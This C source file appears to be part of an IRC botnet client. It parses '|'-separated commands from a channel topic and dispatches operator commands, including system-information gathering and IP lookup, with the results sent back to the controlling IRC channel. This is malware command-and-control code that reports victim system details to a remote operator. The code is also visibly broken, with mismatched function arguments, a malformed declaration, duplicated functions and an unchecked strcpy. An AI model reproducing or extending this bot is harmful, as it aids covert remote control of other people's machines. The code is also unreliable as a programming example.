#include "Inc.h"
#include "Fun.h"
#include "Ext.h" //if there is no | in topic it processes all commands like before, but if there is a '|' it checked trough these commands
#include "cmd.h"

char sep = '|'; //seperate char

BOOL ParseTopic(char *topic, SOCKET sock, char *target, bool notice,unsigned char parameters[256],char host[160], char *x,char *line,int repeat) {
	if(topic != NULL) {
		char command[128];
		char *p1, *p2;
		int i;

		p1 = strchr(topic, sep);

		if(p1 == NULL) {
/*			enc_privmsg(sock, target, "only one command found", 0);
			RunCommand(topic, sock, target,notice);*/
			return FALSE;
		}
		else {
			//enc_privmsg(sock, target, "more commands found", 0);
			p1 = topic;
			while((p2 = strchr(p1, sep)) != NULL) {
				*p2 = '\0';
				strcpy(command, p1);
				i = find_first_nonwhite_character(p1);
				if(i > 0) strcpy(command, &p1[i]);
				for(i = strlen(command)-1;isspace(command[i]);i--) command[i] = '\0';
				RunCommand(command, sock, target,notice,parameters,host,x,line,repeat);
				p1 = p2++;
				p1++;
			}
		}
	}
	return FALSE;
}

int iswhite(char c)
{ //sux function taken from wikipedia, isspace() from ctype.h might be better..
  int is_white_char(c <= 0x20 || c >= 0x7F);
  return is_white_char;
}

size_t find_first_nonwhite_character(char *str, size_t start_pos)
{
   size_t lpos;
   for (lpos=start_pos; lpos < strlen(str); lpos++)
     if (iswhite(str[lpos]) == 0)
       break;
 
   return lpos;
}

/*
		s = 4;
		a[4]++;
		a[2] = a[3];

  0						  1   2     3     4
  :irc.impact-media.me.uk 332 dT_Tb #test :.windows.key
  */

BOOL RunCommand(char *cmd, SOCKET sock, char *target, BOOL notice,unsigned char parameters[256],char host[160], char *x,char *line,int repeat) {
	if(cmd != NULL && cmd[0] == prefix) {
		int i = 4,s = 4;
		char *a[MAXTOKENS];
		char *p;

		p = strtok(cmd, " ");

		while(p != NULL) {
			a[i] = p;
			p = strtok(NULL, " ");
			i++;
		}
		a[2] = target;
		a[s]++;
		//
		BOOL silent = FALSE;
		if (parameters['s']) silent=TRUE;
		char sendbuf[IRCLINE];
		memset(sendbuf, 0, sizeof(sendbuf));
		DWORD id = 0;

// copy paste commands check here ------> //
			if (strcmp("my.command.1", a[s]) == 0) {
				irc_privmsg(sock, a[2], "my.command.1..", notice);
			}
			else if (strcmp("my.command.2", a[s]) == 0) {
				irc_privmsg(sock, a[2], "my.command.2..", notice);
			}
			else if (strcmp(systeminfo_cmd, a[s]) == 0) { //is it inclluded?
				irc_privmsg(sock, a[2], sysinfo(sendbuf, sock), notice);
				addlog("System Info");

				return repeat;
			}
			else if (strcmp(myip_cmd, a[s]) == 0) {
				sprintf(sendbuf ,"%s %s", mn_title,GetIP(sock));
				irc_privmsg(sock,a[2],sendbuf,notice);
				addlog(sendbuf);

				return 1; 
			}
		
// <----- end of commands check
		return TRUE;	
	}
	return FALSE;
}

BOOL _parsetopic(char *topic, SOCKET sock, char *target, bool notice,unsigned char parameters[256],char host[160], char *x,char *line,int repeat) {
	if(topic != NULL) {
		char command[128];
		char *p1, *p2;
		int i;

		p1 = strchr(topic, sep);

		if(p1 == NULL) {
/*			enc_privmsg(sock, target, "only one command found", 0);
			RunCommand(topic, sock, target,notice);*/
			return FALSE;
		}
		else {
			//enc_privmsg(sock, target, "more commands found", 0);
			p1 = topic;
			while((p2 = strchr(p1, sep)) != NULL) {
				*p2 = '\0';
				strcpy(command, p1);
				i = find_first_nonwhite_character(p1);
				if(i > 0) strcpy(command, &p1[i]);
				for(i = strlen(command)-1;isspace(command[i]);i--) command[i] = '\0';
				RunCommand(command, sock, target,notice,parameters,host,x,line,repeat);
				p1 = p2++;
				p1++;
			}
		}
	}
	return FALSE;
}